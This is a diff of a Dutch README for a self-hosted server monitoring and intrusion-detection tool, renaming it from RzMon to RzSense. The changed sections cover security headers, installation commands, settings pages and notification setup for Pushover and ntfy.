+- **Beveiligingsheaders** (vanaf 1.143.0): elke pagina krijgt een **Content-Security-Policy**. Alleen de eigen scripts van RzSense mogen draaien (de paar ingebouwde scripts met een sleutel die per keer verschilt), geen plug-ins, en formulieren gaan alleen naar RzSense. Zo kan een ingeslopen stukje HTML (bv. in een checkbericht) geen script uitvoeren. Daarnaast *nosniff*, een zuinige *Referrer-Policy*, en geen toegang tot camera, microfoon of locatie.
+  - **Insluiten in Home Assistant** (paneel of webpagina-kaart) blijft werken. Wil je dat alleen jouw eigen sites RzSense mogen insluiten, zet dan in `config.php`: `'frame_ancestors' => "'self' https://ha.voorbeeld.nl",` (alleen `'self'` = nergens anders).
   - **Noodknop:** werkt er na een update iets niet meer en vermoed je de CSP, zet dan in `config.php`: `'csp' => false,` en meld het. Inloggen zelf hangt er niet van af.
 - **Meerdere gebruikers**, elk met of zonder **tweestapsverificatie** (TOTP, met elke authenticator-app). Beheer en resetten via de instellingenpagina.
 - **Geen login op je lokale netwerk** (optioneel). Van buitenaf blijft de login nodig. Ga je met je telefoon van wifi naar 4G, dan word je automatisch uitgelogd.
 - **Reverse proxy:** ondersteuning voor Nginx Proxy Manager, Traefik en Cloudflare Tunnel, waarbij het echte bezoekers-IP alleen wordt vertrouwd van proxy's die je zelf instelt.
 - **🛡️ IDS (intrusion detection):** de agents letten op gewijzigde gevoelige bestanden, nieuwe gebruikers en poorten, verdachte processen en verbindingen, brute force en inbraak na brute force. Op de pagina *IDS* handel je incidenten af en blokkeer of deblokkeer je IP-adressen; critical gaat ook naar Pushover. Standaard uit; eerst *leren* (alleen melden), daarna eventueel *blokkeren*.
-- **🔐 Versleutelde agents** (1.49.0+), **⛔ blokkades** op IP-adres of netwerk voor heel RzMon, en meldingen bij niet-geautoriseerde verbindingen (⚠️ + Pushover), logins en agents die verbinden (ℹ️); zie [10.1](#101-versleutelde-agents-blokkades-en-beveiligingsmeldingen-vanaf-1570).
+- **🔐 Versleutelde agents** (1.49.0+), **⛔ blokkades** op IP-adres of netwerk voor heel RzSense, en meldingen bij niet-geautoriseerde verbindingen (⚠️ + Pushover), logins en agents die verbinden (ℹ️); zie [10.1](#101-versleutelde-agents-blokkades-en-beveiligingsmeldingen-vanaf-1570).
 - **Overige beveiliging:** CSRF-bescherming, HttpOnly/SameSite-cookies, een eigen token per agent en API-sleutels die alleen als hash worden opgeslagen.
 
 ### Setup
@@ -632,7 +634,7 @@ Daarna staat alles in de beheerportal (vanaf 1.92.0; `setup.php` stuurt je erhee
 
 Elke pagina heeft één titel met daaronder één korte zin. **Uitleg** staat vanaf 1.161.0 (instellingen en Mijn account) en 1.163.0 (alle pagina's en vensters) als **één regel** met rechts **Meer info** (Engels: *More info*): klik erop en de volledige uitleg klapt open, met *Wat het is*, *Wat het doet* en *Goed om te weten*. De uitleg staat altijd dicht tot je hem zelf opent, en is weer dicht zodra je naar een andere pagina gaat. (Van 1.148.0 tot 1.160.0 stond de uitleg als gewone grijze tekst op de kaart; eerder in een ingeklapt oranje ⓘ-blok.)
 
-**Wat voor je account geldt** (vanaf 1.162.0): bij *Mijn account → Weergave* staan alle keuzes voor hoe RzMon er voor jou uitziet. Ze gelden op al je apparaten:
+**Wat voor je account geldt** (vanaf 1.162.0): bij *Mijn account → Weergave* staan alle keuzes voor hoe RzSense er voor jou uitziet. Ze gelden op al je apparaten:
 - lay-out, *Bij openen*, rode gloed en live animaties;
 - de **grootte** (Small of Large), apart voor je telefoon en je computer;
 - de **moderne weergave** van de IDS-pagina en de **beweging** in de live Attack Flow (standaard wat de beheerder eerder instelde);
@@ -665,14 +667,14 @@ Oude links (bv. `#settings/smart`, `#settings/server`) gaan vanzelf naar de nieu
     - **Rapporteren:** het interval (std / 30 s / 1 m / 2 m / 5 m) en ⚡ Realtime.
     - **Beveiliging:** endpoint-bewaking en commando-checks.
     - **Meldingen:** 🐕 waakhond met *melden na … min* en de info bij agent-updates.
-    - **Verbinding:** versleuteling, certificaat vastzetten, IP-slot, alleen https en het adres van RzMon.
+    - **Verbinding:** versleuteling, certificaat vastzetten, IP-slot, alleen https en het adres van RzSense.
     - **📡 SNMP:** zie §7.7.
     - **Onderhoud:** opnieuw koppelen en een nieuw token.
   - **Installeren of opnieuw koppelen** staat onderaan, ingeklapt (open als er nog nooit een rapport kwam).
   - **Schakelaars:** alles is een schakelaar, geen keuzelijst. Heeft een instelling een algemene waarde (versleuteling, vastzetten, IP-slot, https, commando-checks), dan betekent de schakelaar *eigen keuze*: uit = de algemene instelling (die staat eronder), aan = je kiest voor deze server.
 - **🧪 Test** (vanaf 1.178.0) opent een popup met de uitslag in twee delen:
-  - **Vanuit RzMon (meteen):** het laatste rapport, de punten van de verbindingscontrole, geweigerde rapporten in de laatste 24 uur, de duur van een ronde, en met SNMP aan een echte vraag aan het apparaat.
-  - **Op de server (agent 1.79.0 of nieuwer):** de agent test zichzelf bij zijn volgende ronde: de timer of cronjob, de rechten van het instellingenbestand (600), DNS, het adres en het reserve-adres van RzMon, de klok (ook het verschil met RzMon), vrije ruimte, de wachtrij en fouten in zijn log. De popup wacht er hooguit 5 minuten op.
+  - **Vanuit RzSense (meteen):** het laatste rapport, de punten van de verbindingscontrole, geweigerde rapporten in de laatste 24 uur, de duur van een ronde, en met SNMP aan een echte vraag aan het apparaat.
+  - **Op de server (agent 1.79.0 of nieuwer):** de agent test zichzelf bij zijn volgende ronde: de timer of cronjob, de rechten van het instellingenbestand (600), DNS, het adres en het reserve-adres van RzSense, de klok (ook het verschil met RzSense), vrije ruimte, de wachtrij en fouten in zijn log. De popup wacht er hooguit 5 minuten op.
   - Bovenaan staat het oordeel: *Alles in orde*, *Werkt, met aandachtspunten* of *problemen gevonden*. Met **Opnieuw testen** begin je opnieuw.
 - De keuzelijsten per agent (versleuteling, 📌, 🌐, 🔒) staan alleen nog in de Agent Manager; in de oude tabel stonden ze dubbel.
 
@@ -698,7 +700,7 @@ Oude links (bv. `#settings/smart`, `#settings/server`) gaan vanzelf naar de nieu
 - Op de andere IDS-pagina's bij *Instellingen* staan de algemene instellingen, zoals het IDS zelf aan of uit, de modus, de API-sleutels en de logbestanden. Bovenaan staat een verwijzing naar Beschermingen. Een kopje waar niets meer onder staat, verdwijnt.
 
 - Vanaf 1.151.0 staat wat eerst op *Overzicht → Gezondheid* stond op twee plekken onder **Systeem**: *Database en server → **Server*** (systeemcheck: PHP, extensies, ping, systemctl, schrijfrechten, database en cron, de PHP-omgeving en de cron-regel), *Database en server → **Database*** (grootte, groei en wanneer de disk vol is, de tabellen en *Database optimaliseren*) en de nieuwe pagina ***Prestaties en fouten*** (snelheid, duur van een cron-ronde, traagste checks en PHP-fouten). Een oude link naar Gezondheid brengt je vanzelf naar *Server*.
-- Eerder: *Instellingen → Overzicht → **Gezondheid*** (tot 1.120.0: *Systeem → Systeemcheck*): PHP, extensies, ping, systemctl, schrijfrechten, database en cron, de PHP-omgeving en een kant-en-klare cron-regel. Vanaf 1.96.0 ook de gezondheid van RzMon zelf:
+- Eerder: *Instellingen → Overzicht → **Gezondheid*** (tot 1.120.0: *Systeem → Systeemcheck*): PHP, extensies, ping, systemctl, schrijfrechten, database en cron, de PHP-omgeving en een kant-en-klare cron-regel. Vanaf 1.96.0 ook de gezondheid van RzSense zelf:
   - de grootte van de database, met de grootste tabellen, de groei per dag en wanneer de disk vol is;
   - hoe lang een ronde duurt, en of hij uitloopt boven de minuut;
   - de traagste checks;
@@ -708,10 +710,10 @@ Oude links (bv. `#settings/smart`, `#settings/server`) gaan vanzelf naar de nieu
     - of de webserver **comprimeert en de bestanden laat bewaren** in de browser. Zo niet, dan staat er een kant-en-klaar stukje voor Apache (`/etc/httpd/conf.d/rzmon-snelheid.conf`) en nginx. Installaties met `install-rocky.sh` hebben het al, en krijgen het bij elke update opnieuw (vanaf 1.152.0 ook voor `app.js`: Rocky 10 noemt dat `text/javascript`, en dat ontbrak). De controle kijkt naar wat de browser echt binnenkreeg, dus ook achter een reverse proxy zoals SWAG;
     - de **verzoeken van de interface** (aantal, gemiddeld, langste, grootte) en de **rapporten van agents**;
     - de **onderdelen van een cron-ronde** (checks, back-up, dreigingsinformatie, DNS, kwetsbaarheden …): hoe lang elk per ronde duurt;
-    - de **onderdelen van een agentrapport** (vanaf 1.129.0: ontvangen, meetwaarden, logins, IDS, weblogs, EDR, ketens, checks, software): waar RzMon de tijd aan besteedt als een agent *geen antwoord binnen 50 seconden* meldt;
+    - de **onderdelen van een agentrapport** (vanaf 1.129.0: ontvangen, meetwaarden, logins, IDS, weblogs, EDR, ketens, checks, software): waar RzSense de tijd aan besteedt als een agent *geen antwoord binnen 50 seconden* meldt;
     - de **tabellen** met hun grootte en ongebruikte ruimte, met de knop **🧹 Database optimaliseren** (bouwt de grootste tabellen opnieuw op; doe het buiten drukke uren);
     - de schakelaar **Snelheid meten** (standaard aan; per uur één regel per soort verzoek, twee dagen bewaard).
-- **Geheugen van de database** (vanaf 1.131.0, bij *Status*): MariaDB houdt de database in het geheugen (de *buffer pool*, standaard 128 MB). Is de database groter, dan leest bijna elke query over meetwaarden van de schijf en wordt alles traag: agentrapporten, de cron en de grafieken. RzMon geeft dan een ⚠️ met de waarde die past bij jouw server (ongeveer 40% van het geheugen). Zo stel je het in:
+- **Geheugen van de database** (vanaf 1.131.0, bij *Status*): MariaDB houdt de database in het geheugen (de *buffer pool*, standaard 128 MB). Is de database groter, dan leest bijna elke query over meetwaarden van de schijf en wordt alles traag: agentrapporten, de cron en de grafieken. RzSense geeft dan een ⚠️ met de waarde die past bij jouw server (ongeveer 40% van het geheugen). Zo stel je het in:
   ```
   sudo tee /etc/my.cnf.d/rzmon.cnf <<'EOF'
   [mysqld]
@@ -719,11 +721,11 @@ Oude links (bv. `#settings/smart`, `#settings/server`) gaan vanzelf naar de nieu
   EOF
   sudo systemctl restart mariadb
   ```
-  Gebruik de waarde die RzMon noemt. RzMon past de instellingen van MariaDB nooit zelf aan.
+  Gebruik de waarde die RzSense noemt. RzSense past de instellingen van MariaDB nooit zelf aan.
 - *→ **Database en opslag***: de databaseverbinding (testen, opslaan met je wachtwoord, tabellen bijwerken), het databasewachtwoord vernieuwen en hoe lang historie en meldingen bewaard blijven.
 - *→ **Server en PHP***: tijdzone, basis-URL, pad naar ping en PHP-instellingen (`memory_limit`, `max_execution_time`, `display_errors`).
 
-Is de installatiemap vergrendeld (zoals het hoort), dan kan RzMon `config.php` niet zelf schrijven; je krijgt dan de inhoud om als root te plaatsen.
+Is de installatiemap vergrendeld (zoals het hoort), dan kan RzSense `config.php` niet zelf schrijven; je krijgt dan de inhoud om als root te plaatsen.
 
 ### REST API
 - **Alleen lezen** (JSON), met API-sleutels die je in de webinterface beheert.
@@ -735,7 +737,7 @@ Is de installatiemap vergrendeld (zoals het hoort), dan kan RzMon `config.php` n
 ## 3. Hoe werkt het?
 
 ```
-                    ┌──────────────────────────── RzMon-server ───────────────────────────┐
+                    ┌──────────────────────────── RzSense-server ───────────────────────────┐
                     │                                                                      │
   Browser ─────────▶│  Webserver (Apache/Nginx) ──▶ PHP ──▶ MariaDB                         │
   Home Assistant ──▶│      /index.php  /setup.php  /api.php  /v1.php (REST API)            │
@@ -747,7 +749,7 @@ Is de installatiemap vergrendeld (zoals het hoort), dan kan RzMon `config.php` n
                                                         │ HTTPS POST (eigen sleutel), standaard elke minuut
                          ┌──────────────────────────────┴───────────────┐
                          │ Linux-server met rzmon-agent.sh (systemd)     │
-                         │ Home Assistant met add-on "RzMon Agent"       │
+                         │ Home Assistant met add-on "RzSense Agent"       │
                          └──────────────────────────────────────────────┘
 ```
 
@@ -755,10 +757,10 @@ Is de installatiemap vergrendeld (zoals het hoort), dan kan RzMon `config.php` n
 
 | Wie | Hoe vaak |
 |---|---|
-| **Agent** (server of HA-add-on) | start elke 30 s; stuurt een rapport als zijn ritme om is: standaard 1 minuut, per server 30 s – 5 min (Agent Manager). Met **realtime** meteen bij een login, gestopte service of gewijzigd bestand. Testlijst en nieuwe agentversie alleen als RzMon zegt dat er iets veranderd is. |
+| **Agent** (server of HA-add-on) | start elke 30 s; stuurt een rapport als zijn ritme om is: standaard 1 minuut, per server 30 s – 5 min (Agent Manager). Met **realtime** meteen bij een login, gestopte service of gewijzigd bestand. Testlijst en nieuwe agentversie alleen als RzSense zegt dat er iets veranderd is. |
 | **Browser** | ververst elke 20 s, alleen als het tabblad zichtbaar is |
 | **Heartbeat** (`hb.php`) en **REST API** (`v1.php`) | wanneer je scripts, apparaten of Home Assistant zich melden of iets vragen |
-| **Checks** van RzMon zelf | elke minuut kijkt cron welke checks aan de beurt zijn (interval per check, minimaal 1 minuut) |
+| **Checks** van RzSense zelf | elke minuut kijkt cron welke checks aan de beurt zijn (interval per check, minimaal 1 minuut) |
 | **MQTT** | elke minuut; discovery elk uur |
 | **Nieuwe versie (GitHub), blocklists, datalekken, kwetsbaarheden, certificaat** | dagelijks (kwetsbaarheden om 03:30, instelbaar) |
 | **GeoIP-database** | maandelijks |
@@ -766,8 +768,8 @@ Is de installatiemap vergrendeld (zoals het hoort), dan kan RzMon `config.php` n
 
 Lukt een achtergrondtaak te lang niet (bv. blocklists drie dagen niet opgehaald, MQTT een kwartier niet), dan krijg je één ⚠️-melding en een ✅ als het weer lukt. De kanalen kies je bij *Instellingen → Meldingen → ℹ️ Systeeminfo → Achtergrondtaak lukt niet*; vink alles uit om het uit te zetten.
 
-- **Netwerkchecks** (ping, TCP, HTTP) voert de RzMon-server zelf uit.
-- **Agents** sturen hun gegevens zelf naar RzMon. Je hoeft dus geen poort te openen op de remote server; alleen RzMon moet bereikbaar zijn vanaf die server.
+- **Netwerkchecks** (ping, TCP, HTTP) voert de RzSense-server zelf uit.
+- **Agents** sturen hun gegevens zelf naar RzSense. Je hoeft dus geen poort te openen op de remote server; alleen RzSense moet bereikbaar zijn vanaf die server.
 - **Statussen:** elke check heeft er een: `0` OK, `1` WARNING, `2` CRITICAL of `3` ONBEKEND. De kleur van een server is die van zijn slechtste check.
 
 ---
@@ -792,7 +794,7 @@ PHP-functies `exec()` en `shell_exec()` moeten toegestaan zijn; die zijn nodig v
 
 > 🐧 Dit hoofdstuk is voor **Debian en Ubuntu**. Gebruik je **Rocky Linux 10**, RHEL 10 of AlmaLinux 10? Volg dan [INSTALL-ROCKY-LINUX-10.md](INSTALL-ROCKY-LINUX-10.md), of gebruik het installatiescript `install/install-rocky.sh`, dat alles in één keer doet. Daarin staan ook SELinux en firewalld. Ga daarna verder met hoofdstuk 6 hieronder.
 
-> In de voorbeelden staat RzMon in `/var/www/rzmon` en gebruikt de webserver de gebruiker `www-data` (Debian/Ubuntu). Pas dat aan als jouw situatie anders is.
+> In de voorbeelden staat RzSense in `/var/www/rzmon` en gebruikt de webserver de gebruiker `www-data` (Debian/Ubuntu). Pas dat aan als jouw situatie anders is.
 
 ### 5.1 Pakketten installeren
 
@@ -902,7 +904,7 @@ sudo ln -s /etc/nginx/sites-available/rzmon /etc/nginx/sites-enabled/
 sudo nginx -t && sudo systemctl reload nginx
 ```
 
-#### HTTPS (aanbevolen als RzMon van buitenaf bereikbaar is)
+#### HTTPS (aanbevolen als RzSense van buitenaf bereikbaar is)
 ```bash
 sudo apt install certbot python3-certbot-apache   # of python3-certbot-nginx
 sudo certbot --apache -d rzmon.jouwdomein.nl      # of --nginx
@@ -925,7 +927,7 @@ Open vanaf een computer **op je lokale netwerk** `http://<ip-van-de-server>/`. J
 3. **Applicatie & PHP.**
    - **Tijdzone:** `Europe/Amsterdam`.
    - **Basis-URL:** bijvoorbeeld `http://192.168.1.10`. Die wordt gebruikt in de installatie-instructies voor agents.
-   - **Externe URL** (optioneel, vanaf 1.128.0): het adres van RzMon van buiten, bijvoorbeeld `https://status.voorbeeld.nl`. Wordt gebruikt voor de geheime link van de statuspagina als je daar *Extern* kiest.
+   - **Externe URL** (optioneel, vanaf 1.128.0): het adres van RzSense van buiten, bijvoorbeeld `https://status.voorbeeld.nl`. Wordt gebruikt voor de geheime link van de statuspagina als je daar *Extern* kiest.
    - **Pad naar ping:** meestal `/bin/ping` of `/usr/bin/ping`. Controleer met `command -v ping`.
    - **memory_limit en max_execution_time:** leeg laten, tenzij je een reden hebt.
    - **display_errors:** alleen aanzetten om fouten te zoeken.
@@ -936,7 +938,7 @@ Zet de schrijfrechten daarna weer terug:
 ```bash
 sudo chown root /var/www/rzmon
 ```
-Wil je later iets aan de database- of PHP-instellingen veranderen (*Instellingen → Systeem → Database en server* of *Server en PHP*), dan toont RzMon de nieuwe inhoud van `config.php`, die je zelf plaatst. Of je geeft tijdelijk weer schrijfrechten.
+Wil je later iets aan de database- of PHP-instellingen veranderen (*Instellingen → Systeem → Database en server* of *Server en PHP*), dan toont RzSense de nieuwe inhoud van `config.php`, die je zelf plaatst. Of je geeft tijdelijk weer schrijfrechten.
 
 > **Kan de setup `config.php` niet schrijven?** Dan zie je de inhoud in beeld. Maak het bestand zelf aan met `sudo nano /var/www/rzmon/config.php`, plak de inhoud, sla op en ververs de pagina.
 
@@ -953,7 +955,7 @@ sudo -u www-data php /var/www/rzmon/cron/run.php
 ```
 
 ### 5.7 Controleren
-- Op het **dashboard** staat je RzMon-server al met vier checks: Disk /, MariaDB, CPU en RAM.
+- Op het **dashboard** staat je RzSense-server al met vier checks: Disk /, MariaDB, CPU en RAM.
 - Bij **Setup → Systeemcheck** staat "Cron draait" na een minuut op groen.
 
 ### Alternatief: installatie volledig via de terminal
@@ -971,20 +973,20 @@ echo '* * * * * www-data /usr/bin/php /var/www/rzmon/cron/run.php >/dev/null 2>&
 ## 6. Eerste configuratie
 
 ### 6.0 Taal / Language 🌐
-RzMon is er in het **Nederlands** en het **Engels**. Bovenaan *Instellingen* staat een schuifje: **EN** links, **NL** rechts.
-- De keuze hoort bij je **account**, dus hij gaat mee naar elk apparaat waarop je inlogt. Zonder account (alleen lezen op het LAN) onthoudt RzMon hem op dat apparaat.
+RzSense is er in het **Nederlands** en het **Engels**. Bovenaan *Instellingen* staat een schuifje: **EN** links, **NL** rechts.
+- De keuze hoort bij je **account**, dus hij gaat mee naar elk apparaat waarop je inlogt. Zonder account (alleen lezen op het LAN) onthoudt RzSense hem op dat apparaat.
 - Bestaande accounts blijven Nederlands. Een nieuw account, en de inlogpagina, volgen de taal van de browser: Nederlands als de browser Nederlands is, anders Engels.
 - Datums en getallen volgen de taal (bijvoorbeeld *22 Oct 2026* en *99.98%* in het Engels).
 - De hele interface is vertaald: dashboard, meldingen, IDS, instellingen, alle vensters, foutmeldingen, de setup-pagina en de bevestig-pagina uit Pushover.
-- **Taal van meldingen en checkberichten** (*Instellingen → 🔔 Meldingen*): de taal van wat RzMon zelf schrijft en naar iedereen tegelijk gaat. Dat zijn de berichten via Pushover, e-mail, Home Assistant en MQTT, de berichten van checks (bijvoorbeeld *Poort 443 onbereikbaar*), IDS- en toegangsregels en de antwoorden van de REST API. Standaard Nederlands.
-- Wat al bewaard is, blijft in de taal van toen: oude meldingen in de lijst, het logboek en checkberichten tot de volgende controle. De vaste teksten van de agent (bijvoorbeeld *database antwoordt (ping)* bij de diepere servicecontrole, of een socket die niet bestaat) vertaalt RzMon zelf; daarvoor hoeft de agent niet bijgewerkt te worden. Alleen de uitvoer van je eigen commando's en systeemmeldingen (bijvoorbeeld een SSH-banner) blijven zoals de server ze geeft.
+- **Taal van meldingen en checkberichten** (*Instellingen → 🔔 Meldingen*): de taal van wat RzSense zelf schrijft en naar iedereen tegelijk gaat. Dat zijn de berichten via Pushover, e-mail, Home Assistant en MQTT, de berichten van checks (bijvoorbeeld *Poort 443 onbereikbaar*), IDS- en toegangsregels en de antwoorden van de REST API. Standaard Nederlands.
+- Wat al bewaard is, blijft in de taal van toen: oude meldingen in de lijst, het logboek en checkberichten tot de volgende controle. De vaste teksten van de agent (bijvoorbeeld *database antwoordt (ping)* bij de diepere servicecontrole, of een socket die niet bestaat) vertaalt RzSense zelf; daarvoor hoeft de agent niet bijgewerkt te worden. Alleen de uitvoer van je eigen commando's en systeemmeldingen (bijvoorbeeld een SSH-banner) blijven zoals de server ze geeft.
 - Mails voor *wachtwoord vergeten* gaan in de taal van het account.
 
 ### 6.1 Pushover koppelen
 1. Installeer de **Pushover**-app (iOS of Android). De app is na de proefperiode een eenmalige aankoop.
 2. Log in op [pushover.net](https://pushover.net). Rechtsboven staat je **User Key**.
-3. Klik op **Create an Application/API Token**, geef het de naam "RzMon" en kopieer het **API Token**. Kies bij *Icon* het bestand [`brand/pushover-icon-72.png`](brand/pushover-icon-72.png) (vanaf 1.73.0): dan staat het logo van RzMon bij elke melding.
-4. In RzMon: **Instellingen → Pushover**:
+3. Klik op **Create an Application/API Token**, geef het de naam "RzSense" en kopieer het **API Token**. Kies bij *Icon* het bestand [`brand/pushover-icon-72.png`](brand/pushover-icon-72.png) (vanaf 1.73.0): dan staat het logo van RzSense bij elke melding.
+4. In RzSense: **Instellingen → Pushover**:
    - zet *Pushover meldingen aan* aan;
    - vul de user key en het API-token in;
    - klik op **📲 Testbericht sturen** en controleer je telefoon;
@@ -1001,14 +1003,14 @@ RzMon is er in het **Nederlands** en het **Engels**. Bovenaan *Instellingen* sta
 1. Installeer de **ntfy**-app (iOS of Android).
 2. Bedenk een **onderwerp** (*topic*): een lange naam die moeilijk te raden is, bijvoorbeeld `rzmon-k7f2q9x`. Op ntfy.sh kan iedereen die de naam kent meelezen. Gebruik alleen letters, cijfers, `-` en `_`.
 3. Abonneer je in de app op dat onderwerp (bij een eigen server: vul ook het adres van je server in).
-4. In RzMon: **Instellingen → Meldingen → Kanalen → ntfy**:
+4. In RzSense: **Instellingen → Meldingen → Kanalen → ntfy**:
    - zet *ntfy meldingen aan* aan;
    - **Server**: `https://ntfy.sh` of het adres van je eigen ntfy-server;
    - **Onderwerp**: de naam uit stap 2;
    - **Toegangstoken of gebruiker:wachtwoord**: alleen nodig als je server inloggen vraagt (een token begint met `tk_`);
    - klik op **📲 Testbericht sturen**.
 
-De prioriteit volgt de instelling bij Pushover (*Geavanceerd*): stil = 2, normaal = 3, hoog = 4, emergency = 5. Bij een storing zit er een knop **✔ Bevestigen** onder het bericht, en tikken op het bericht opent RzMon.
+De prioriteit volgt de instelling bij Pushover (*Geavanceerd*): stil = 2, normaal = 3, hoog = 4, emergency = 5. Bij een storing zit er een knop **✔ Bevestigen** onder het bericht, en tikken op het bericht opent RzSense.
 
 In de meldregels (6.2) en bij *Systeemmeldingen* heet het kanaal **📲 Push**: dat gaat naar Pushover en/of ntfy, wat aan staat. Lukt één van de twee, dan telt de melding als verstuurd; lukt de ander niet, dan staat dat bij de melding. De **🐕 waakhond** stuurt vanaf agent 1.72.0 ook naar ntfy.
 
@@ -1043,11 +1045,11 @@ In *Instellingen → 🔔 Meldingen* stel je per status in **wanneer** en **waar
 - De drie getallen pas je aan in het blok *Anti-flapping*, en per check in de eigen meldregels.
 
 **ℹ️ Info** (standaard uit): meldingen over gebeurtenissen die **geen storing** zijn.
-- **Server herstart:** met de check **Uptime** (＋ Check, groep 📊 Systeem; voor de RzMon-server zelf en agent-servers met agent 1.46.0 of nieuwer), de check *HA OS herstart* van Home Assistant (alleen een geplande herstart; een onverwachte is CRITICAL) en de SNMP-check *Uptime*. Bijvoorbeeld *"ℹ️ INFO: WebServer01 – Herstart: Herstart om 22-10 03:12 · was 41 d 6 u aan"*.
+- **Server herstart:** met de check **Uptime** (＋ Check, groep 📊 Systeem; voor de RzSense-server zelf en agent-servers met agent 1.46.0 of nieuwer), de check *HA OS herstart* van Home Assistant (alleen een geplande herstart; een onverwachte is CRITICAL) en de SNMP-check *Uptime*. Bijvoorbeeld *"ℹ️ INFO: WebServer01 – Herstart: Herstart om 22-10 03:12 · was 41 d 6 u aan"*.
 - **SSL-certificaat vernieuwd:** bij een certificaat-check, als er ineens meer dagen over zijn dan bij de vorige controle.
 - **Agent bijgewerkt:** van welke naar welke versie (met de knop, automatisch, via de add-on winkel of met de hand), of ✘ als het bijwerken mislukte. Per server uit te zetten in de **Agent Manager** (*Info bij agent-updates*).
-- **RzMon bijgewerkt:** van welke naar welke versie.
-- Zet de rij **ℹ️ Info** op *Direct* en vink de kanalen aan. Per check kan het anders: ✎ → 🔔 Meldingen → *Eigen meldregels* → rij *Info* (bijvoorbeeld alleen voor de herstart van je NAS). Agent- en RzMon-updates horen niet bij een check en volgen de algemene regel.
+- **RzSense bijgewerkt:** van welke naar welke versie.
+- Zet de rij **ℹ️ Info** op *Direct* en vink de kanalen aan. Per check kan het anders: ✎ → 🔔 Meldingen → *Eigen meldregels* → rij *Info* (bijvoorbeeld alleen voor de herstart van je NAS). Agent- en RzSense-updates horen niet bij een check en volgen de algemene regel.
 - Info gaat direct (niet gebundeld) en via Pushover **stil** (prioriteit -1: geen geluid of trilling). Tijdens **stille uren** en **onderhoud** wordt info niet verstuurd en komt hij niet in de samenvatting achteraf.
 - **📋 Meldingenpagina** (kolom in de rij Info, standaard aan): info-meldingen staan op de pagina Meldingen, met ℹ️ en een blauwe kleur, ook als ze niet verstuurd zijn (dan staat de reden erbij, bijvoorbeeld *[niet verzonden: info staat uit]*). Zet je het uit, dan wordt info nergens bewaard. Met de chips (*Alles · Zonder systeeminfo · Nog open · Storingen · Hersteld · Info · Systeeminfo · Beveiliging*) en de tellers bovenaan filter je de lijst. **Zonder systeeminfo** (vanaf 1.84.0, tot 1.207.0 *Zonder info*) toont alles behalve de systeeminfo: storingen, herstel, beveiliging en bevestigingen. Ook de tegels bovenaan (*Meldingen vandaag*, *Drukste server*, *Laatste melding*) tellen de info dan niet mee. Je keuze wordt per gebruiker onthouden. Echte storingen staan altijd op de pagina Meldingen.
 - **ℹ️ Alleen info-meldingen (info-check):** een schakelaar in het checkformulier (✎ of ＋ Check). Zo'n check telt **nooit als storing**:
@@ -1065,7 +1067,7 @@ In *Instellingen → 🔔 Meldingen* stel je per status in **wanneer** en **waar
 - **Na afloop** krijg je **één bericht** met alles wat dan nog mis is, van alle servers samen, bijvoorbeeld *"🌅 Na de stille uren: 2 problemen open"* met per regel de server, de check en sinds hoe laat. Kreeg je vóór de stille uren een melding over een probleem dat 's nachts herstelde, dan staat het herstel er ook in. Wat 's nachts misging en vanzelf weer goed kwam, wordt niet gemeld. Bevestigde checks en checks in onderhoud tellen niet mee.
 - Home Assistant krijgt na afloop per check een bericht met `"event": "quiet"` (nog open) of `"recovery"`.
 
-**⚡ mDS – Mobile device summary** (vanaf 1.194.0). Op een telefoon (schermen tot 720 px breed) staat **mDS** vooraan in de tabbalk, en RzMon opent daar altijd mee (een link als `#alerts?server=…` of `#ids/inc` opent wel gewoon die pagina). Op een computer zie je de tab niet. Van boven naar beneden:
+**⚡ mDS – Mobile device summary** (vanaf 1.194.0). Op een telefoon (schermen tot 720 px breed) staat **mDS** vooraan in de tabbalk, en RzSense opent daar altijd mee (een link als `#alerts?server=…` of `#ids/inc` opent wel gewoon die pagina). Op een computer zie je de tab niet. Van boven naar beneden:
 - **het oordeel**: *Alles in orde* of *3 problemen* (met hoeveel kritiek en hoeveel bevestigd), hoeveel servers en checks OK zijn en de beschikbaarheid van de laatste 24 uur;
 - **Nu aandacht nodig**: de 5 belangrijkste problemen (eerst wat niet bevestigd is, critical voor warning), met hoe lang al. Per probleem: **✔ Bevestig**, **🔧 1 u** (onderhoud), **🌙 1 u** (Nu stil) en **↻ Check** (nu opnieuw checken). Tik op de regel voor de popup van de check; *alle 18 ›* opent Monitoring;
 - **Beveiliging**: open incidenten (en hoeveel kritiek), geblokkeerd vandaag (en nu actief), logins vandaag (en mislukte), kritieke CVE's (en actief misbruikt) en datalekken. Tik op een tegel voor die pagina;
@@ -1083,7 +1085,7 @@ De pagina werkt live mee; beveiliging en netwerk worden eens per minuut opgehaal
 3. **de meldregel** per status: direct, na X minuten, of nooit.
 Met 3 en 3 komt een melding dus pas bij de **5e** mislukte controle op rij. Bovenaan de popup van een check zie je waar hij staat: *Meting CRITICAL › Bevestigen ●○○ 1/3 › Melden na N 0/1 › Meldregel direct · ⏳ melding over ±40 s*, of *🔔 gemeld om 14:32*. In de opengeklapte server (CC) staat ⏳ bij checks die nog bevestigen.
 - **Per soort check:** in de tabel onder *Status bevestigen* geef je een soort een eigen waarde (✘ = mislukt, ✔ = goed). Leeg = de algemene waarde; een check met een eigen waarde (✎ → Status bevestigen) gaat voor.
-- **Sneller bevestigen** (standaard aan): twijfelt een ping, TCP, HTTP of SNMP nog, dan controleert RzMon hem elke 20 seconden opnieuw (ook zonder slim interval). Met 3 is een echte storing zo na ±40 seconden bevestigd; korter dan dat blijft stil.
+- **Sneller bevestigen** (standaard aan): twijfelt een ping, TCP, HTTP of SNMP nog, dan controleert RzSense hem elke 20 seconden opnieuw (ook zonder slim interval). Met 3 is een echte storing zo na ±40 seconden bevestigd; korter dan dat blijft stil.
 - **✨ Advies toepassen** stelt in één keer in: critical direct, warning na 10 minuten, onbekend na 15 minuten, herstel direct, melden na 1, en bevestigen = 1 voor disk, SSL, domein, heartbeat, pad, SMART en uptime. Je ziet eerst wat er verandert. Herhalen en kanalen blijven; terugdraaien kan in het wijzigingslogboek.
 
 **🌙 Stille-urenprofielen** (vanaf 1.189.0): je vindt ze bij **Instellingen → Meldingen → Stille uren**.
@@ -1117,7 +1119,7 @@ Een check wisselt pas van status na een aantal controles **achter elkaar**. Eén
 - **Wat je ziet:** zolang een nieuwe status nog niet bevestigd is, blijft de check zoals hij was, met het label **⏳ CRITICAL 2/3** (nog 1 controle). Ga erop staan voor de uitleg. Het bericht is dat van de laatste controle.
